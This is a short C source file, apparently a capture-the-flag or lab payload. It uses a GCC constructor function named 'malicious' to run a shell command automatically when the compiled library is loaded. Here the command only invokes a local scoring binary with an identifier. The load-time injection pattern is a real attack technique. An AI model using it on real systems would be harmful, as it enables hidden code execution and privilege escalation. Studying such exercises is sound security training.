#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 199f261e-8d79-4835-ae48-46827f6a43c9");
}
